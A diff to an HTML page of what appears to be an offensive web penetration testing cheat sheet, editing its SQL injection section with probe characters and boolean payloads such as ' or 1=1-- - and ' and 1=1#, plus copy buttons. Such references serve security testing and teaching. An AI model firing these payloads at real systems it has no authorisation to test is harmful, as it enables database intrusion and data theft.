@@ -31,9 +31,10 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>DEFAULT TEST ATTEMPTS</summary>
-<b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. 
+<b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. Can be used on <u>GET:POST</u> "SEARCH/SELECT"
 	
-Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b>
+Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b> It can be parameters, input 
+fields, etc.
 	
 <b>C1: </b><mark id="HDT001">'</mark>
 <b>C2: </b><mark id="HDT002">''</mark> Try with space as well. <b>' '</b>
@@ -58,6 +59,7 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
 <b>C2: TRUE </b><mark id="HDT02">' and 'a'='a--</mark>
 <b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark><br>
+<b>SAMPLE: </b><mark id="">' and 1=1#</mark>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button>
 
 </details>
